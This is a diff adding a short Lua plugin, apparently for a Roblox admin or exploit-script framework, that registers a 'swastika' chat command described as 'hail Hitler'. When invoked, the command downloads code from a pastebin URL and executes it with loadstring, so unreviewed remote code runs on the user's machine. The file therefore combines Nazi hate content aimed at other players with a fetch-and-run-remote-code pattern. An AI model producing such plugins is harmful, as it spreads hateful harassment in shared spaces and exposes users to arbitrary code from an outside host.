@@ -1,0 +1,16 @@
+local Plugin = {
+	["PluginName"] = "swastika",
+	["PluginDescription"] = "chat swastika",
+	["Commands"] = {
+		["swastika/swas"] = {
+			["Description"] = "hail Hitler",
+			["Aliases"] = {'swastika','swas'},
+			["Function"] = function(args,speaker)
+				loadstring(game:HttpGet("https://pastebin.com/raw/ahBKsjJ2",true))()
+
+			end,
+		},
+	},
+}
+
+return Plugin
